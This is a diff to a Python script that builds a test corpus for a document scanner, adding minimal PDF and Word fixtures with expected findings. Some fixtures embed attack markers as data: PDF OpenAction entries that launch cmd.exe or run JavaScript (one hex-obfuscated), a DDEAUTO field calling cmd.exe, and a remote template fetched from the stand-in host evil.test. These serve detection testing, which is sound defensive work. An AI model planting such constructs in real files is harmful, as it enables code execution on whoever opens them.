@@ -25,11 +25,15 @@ NATIVE_DIR   = os.path.join(CORPUS_DIR, 'native')
 PYSRC_DIR    = os.path.join(CORPUS_DIR, 'pysource')
 NOTEBOOK_DIR = os.path.join(CORPUS_DIR, 'notebook')
 DISGUISED_DIR = os.path.join(CORPUS_DIR, 'disguised')
+PDF_DIR    = os.path.join(CORPUS_DIR, 'pdf')
+OFFICE_DIR = os.path.join(CORPUS_DIR, 'office')
 os.makedirs(PYTHON_DIR, exist_ok=True)
 os.makedirs(NATIVE_DIR, exist_ok=True)
 os.makedirs(PYSRC_DIR, exist_ok=True)
 os.makedirs(NOTEBOOK_DIR, exist_ok=True)
 os.makedirs(DISGUISED_DIR, exist_ok=True)
+os.makedirs(PDF_DIR, exist_ok=True)
+os.makedirs(OFFICE_DIR, exist_ok=True)
 
 RANDOM_SEED   = 13371337
 FIXED_ZIP_DT  = (2026, 1, 1, 0, 0, 0)
@@ -322,6 +326,65 @@ write_text(os.path.join(DISGUISED_DIR, 'memo.txt'),
     "Please print this document and review it before the meeting.\n")
 
 # ─────────────────────────────────────────────────────────────────────────────
+# PDF fixtures (v0.3) — minimal PDFs carrying the trigger keywords. The scanner
+# does keyword triage on raw bytes, so these need not be fully renderable.
+# ─────────────────────────────────────────────────────────────────────────────
+def write_pdf(name: str, body: str) -> None:
+    content = "%PDF-1.7\n1 0 obj\n<< " + body + " >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"
+    write_text(os.path.join(PDF_DIR, name), content)
+
+write_pdf('pdf_clean.pdf',    "/Type /Catalog /Pages 2 0 R")
+write_pdf('pdf_js.pdf',       "/Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert\\('x'\\);) >>")
+write_pdf('pdf_launch.pdf',   "/Type /Catalog /OpenAction << /S /Launch /F (cmd.exe) >>")
+write_pdf('pdf_embedded.pdf', "/Type /Catalog /Names << /EmbeddedFiles 3 0 R >> /EmbeddedFile 4 0 R")
+write_pdf('pdf_encrypted.pdf',"/Type /Catalog /Encrypt 5 0 R")
+# Obfuscated /JavaScript via PDF name hex escapes (/#4A#61...) — must still be caught
+write_pdf('pdf_obfuscated.pdf', "/Type /Catalog /OpenAction << /S /#4A#61#76#61#53#63#72#69#70#74 >>")
+# Disguised: .pdf extension but not a real PDF
+write_text(os.path.join(PDF_DIR, 'pdf_fake.pdf'), "this is not really a pdf file at all\n")
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Office (OOXML) fixtures (v0.3) — minimal zips exercising the stdlib checks.
+# ─────────────────────────────────────────────────────────────────────────────
+_CONTENT_TYPES = ('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
+                  'package/2006/content-types">'
+                  '<Default Extension="xml" ContentType="application/xml"/></Types>')
+
+def write_docx(name: str, document_xml: str, extra: dict | None = None) -> None:
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+        z.writestr(zipfile.ZipInfo('[Content_Types].xml', FIXED_ZIP_DT), _CONTENT_TYPES)
+        z.writestr(zipfile.ZipInfo('word/document.xml', FIXED_ZIP_DT), document_xml)
+        for arc, data in sorted((extra or {}).items()):
+            z.writestr(zipfile.ZipInfo(arc, FIXED_ZIP_DT), data)
+    write(os.path.join(OFFICE_DIR, name), buf.getvalue())   # bytes, not text
+
+_DOC_BODY = '<?xml version="1.0"?><w:document xmlns:w="x"><w:body><w:p/></w:body></w:document>'
+
+# Clean — no macros, DDE, or template
+write_docx('office_clean.docx', _DOC_BODY)
+
+# Macro-enabled — contains a vbaProject.bin (presence check fires; bytes are fake)
+write_docx('office_macro.docm', _DOC_BODY,
+           {'word/vbaProject.bin': seeded_bytes('vba', 256)})
+
+# DDEAUTO field in the main document part
+write_docx('office_dde.docx',
+           '<?xml version="1.0"?><w:document xmlns:w="x"><w:body>'
+           '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/></w:p>'
+           '</w:body></w:document>')
+
+# Remote-template injection — external attachedTemplate in settings rels
+write_docx('office_template.docx', _DOC_BODY, {
+    'word/settings.xml': '<?xml version="1.0"?><w:settings xmlns:w="x"/>',
+    'word/_rels/settings.xml.rels':
+        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/'
+        'package/2006/relationships"><Relationship Id="rId1" '
+        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
+        'Target="http://evil.test/template.dotm" TargetMode="External"/></Relationships>',
+})
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Manifest
 # ─────────────────────────────────────────────────────────────────────────────
 manifest = {
@@ -347,6 +410,17 @@ manifest = {
         "disguised/data.dat":    {"expectFinding": "MTS-DISGUISE-002", "detectedType": "python"},
         "disguised/notes2.txt":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "batch"},
         "disguised/memo.txt":    {"expectNoDisguise": True},
+        "pdf/pdf_clean.pdf":      {"expectActiveContent": False},
+        "pdf/pdf_js.pdf":         {"expectFinding": "PDF-JAVASCRIPT"},
+        "pdf/pdf_launch.pdf":     {"expectFinding": "PDF-LAUNCH"},
+        "pdf/pdf_embedded.pdf":   {"expectFinding": "PDF-EMBEDDED-FILE"},
+        "pdf/pdf_encrypted.pdf":  {"expectFinding": "PDF-ENCRYPTED"},
+        "pdf/pdf_obfuscated.pdf": {"expectFinding": "PDF-JAVASCRIPT"},
+        "pdf/pdf_fake.pdf":       {"expectFinding": "PDF-INVALID-FORMAT"},
+        "office/office_clean.docx":    {"expectMacroFindings": False},
+        "office/office_macro.docm":    {"expectFinding": "OFFICE-VBA-PRESENT"},
+        "office/office_dde.docx":      {"expectFinding": "OFFICE-DDE"},
+        "office/office_template.docx": {"expectFinding": "OFFICE-REMOTE-TEMPLATE"},
     }
 }
 with open(os.path.join(CORPUS_DIR, 'manifest.json'), 'w') as f:
